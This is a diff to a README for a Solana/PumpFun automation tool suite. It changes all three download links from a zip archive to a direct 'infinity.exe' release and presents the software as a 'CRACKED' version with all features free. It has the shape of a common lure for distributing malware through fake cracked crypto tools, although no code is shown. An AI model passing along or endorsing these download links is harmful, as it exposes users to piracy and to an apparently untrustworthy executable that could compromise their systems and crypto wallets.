@@ -6,11 +6,11 @@ Infinity Scripts offers a suite of specialized automation tools designed to stre
 <img src="https://i.imgur.com/MZ8oOvp.jpeg" alt="InfinityScript" width="600"/>
 
 
-[Precompiled Build](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/InfinityAIO.zip)
+[Precompiled Build](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/infinity.exe)
 > **Note**  
 > This is the **CRACKED** version it means you can use **ALL FEATURES** for **FREE**
 
-[Download](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/InfinityAIO.zip)
+[Download](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/infinity.exe)
 ---
 
 ## 🔧 Available Tools
@@ -84,4 +84,4 @@ Use these scripts at your own risk. We do not assume any liability for the actio
 
 ---
 
-[Download](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/InfinityAIO.zip)
+[Download](https://github.com/vegashard/InfinityAIO-Solana-PumpFun-Tool-Unlocked/releases/download/Releases/infinity.exe)
